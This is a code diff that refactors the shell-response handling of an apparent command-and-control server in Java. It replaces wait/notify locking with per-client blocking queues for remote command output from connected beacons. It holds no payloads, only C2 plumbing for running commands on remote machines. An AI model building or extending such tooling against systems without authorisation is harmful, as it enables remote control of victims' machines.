@@ -15,6 +15,7 @@ import java.util.HashSet;
 import java.util.Map;
 import java.util.Scanner;
 import java.util.concurrent.ArrayBlockingQueue;
+import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.ThreadPoolExecutor;
@@ -23,7 +24,6 @@ import java.util.concurrent.TimeUnit;
 import org.json.JSONObject;
 
 import Servers.Duplexer;
-import Servers.notifyLock;
 import Servers.encryption.aes.*;
 import Servers.encryption.rsa.*;
 
@@ -57,11 +57,9 @@ public class C2Server implements Runnable{
     // String for an IP address of a beacaon attempting to authenticate
     private String attemptedAuthIP;
 
-    // Object used as lock for wait()/notify() to get responses instantly when in a shell
-    private Object shellLock;
-
-    // ID used by threads to make sure that .notify() is not called extra times multiple times
-    private int shellID;
+    // Pending /shell requests, keyed by target client IP. A beacon thread hands the
+    // command output to the waiting API thread through the queue.
+    private final ConcurrentHashMap<String, BlockingQueue<String>> pendingShells = new ConcurrentHashMap<>();
 
     // Object used to do RSA encryption and Decryption
     private rsa rsa;
@@ -89,8 +87,6 @@ public class C2Server implements Runnable{
      * @throws IOException
      */
     public C2Server() throws IOException{
-        this.shellLock = new Object();
-        this.shellID = 0;
         this.longRangeBeacons = new ConcurrentHashMap<>();
         this.serverSocket = new ServerSocket(1234);
         this.apiHandler = new C2ServerAPI(this);
@@ -269,41 +265,42 @@ public class C2Server implements Runnable{
         clientLastSeen.put(IPAddress, new Time(System.currentTimeMillis()));
     }
 
-    public int getShellID(){
-        return shellID;
+    /**
+     * Runs a command on a single client (scope must be one IP) and blocks until that client
+     * responds or a timeout elapses, then returns the command's output.
+     *
+     * @param scope - the target client IP
+     * @param command - the command to run
+     * @return the client's response, or an empty string if none arrived before the timeout
+     */
+    protected String getShellResponse(String scope, String command){
+        BlockingQueue<String> queue = new ArrayBlockingQueue<>(1);
+        // Register before sending so a fast response can't be missed
+        pendingShells.put(scope, queue);
+        try{
+            distributeCommandToBeacons(scope, command);
+            String out = queue.poll(10, TimeUnit.SECONDS);
+            return out == null ? "" : out;
+        } catch (InterruptedException e){
+            Thread.currentThread().interrupt();
+            return "";
+        } finally {
+            // Only remove if it's still our queue (a concurrent shell for the same IP may have replaced it)
+            pendingShells.remove(scope, queue);
+        }
     }
 
     /**
-     * Takes in the scope and command, executes the command on the system. Then, waits for the response to the command to be returned, and outputs the resopnse immeditely
-     * 
-     * @param scope - scope of the command
-     * @param command - command 
+     * Hands a client's command output to a /shell request waiting on that client, if any.
+     * No-op when no shell is waiting for this IP.
+     *
+     * @param ip - the client IP the response came from
+     * @param response - the command output
      */
-    protected void getShellResponse(String scope, String command){
-        // Create a new thread that will notify the lock after 10 seconds, just in case we don't receive anything back from the client
-        shellID++;
-        notifyLock backupNotifyLock = new notifyLock(shellLock, this, shellID);
-        Thread backupNotifyLockThread = new Thread(backupNotifyLock);
-        backupNotifyLockThread.start();
-
-        // Distribute the commands
-        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
-            beaconHandler.setIsShell(true);
-        }
-        distributeCommandToBeacons(scope, command);
-
-        // Wait for a response, once notified, notify the user handler that it can now continue
-        try{
-            synchronized(shellLock){
-                shellLock.wait();
-            }
-        } catch (InterruptedException e){
-            e.printStackTrace();
-        }
-        
-        // Set each beaconHandler to not notify when it receives a response now
-        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
-            beaconHandler.setIsShell(false);
+    protected void offerShellResponse(String ip, String response){
+        BlockingQueue<String> queue = pendingShells.get(ip);
+        if(queue != null){
+            queue.offer(response);
         }
     }
 
@@ -368,28 +365,6 @@ public class C2Server implements Runnable{
             }
         }
         return responses;
-    }
-
-    /**
-     * Returns a point-in-time copy of a single client's responses, taken under the
-     * appropriate lock. Used by /shell to diff responses before and after a command
-     * without racing the beacon thread that appends to the live list.
-     *
-     * @param ip - IP Address of the client
-     * @return a copy of the client's responses, or an empty list if the client is unknown
-     */
-    protected ArrayList<String> snapshotResponsesForIP(String ip){
-        synchronized(windowsClientResponses){
-            if(windowsClientResponses.containsKey(ip)){
-                return new ArrayList<>(windowsClientResponses.get(ip));
-            }
-        }
-        synchronized(linuxClientResponses){
-            if(linuxClientResponses.containsKey(ip)){
-                return new ArrayList<>(linuxClientResponses.get(ip));
-            }
-        }
-        return new ArrayList<>();
     }
 
     protected void disableUser(String username){
@@ -640,7 +615,7 @@ public class C2Server implements Runnable{
                     duplexer.close();
                 }else{
                     // Create a new thread to handle each Long Range Beacon
-                    C2ServerBeaconHandler beaconHandler = new C2ServerBeaconHandler(duplexer, IPAddress, this, shellLock, aes);
+                    C2ServerBeaconHandler beaconHandler = new C2ServerBeaconHandler(duplexer, IPAddress, this, aes);
                     Thread beaconHandlerThread = new Thread(beaconHandler);
 
                     // Store IP and Duplexer pointer in the dicitonary
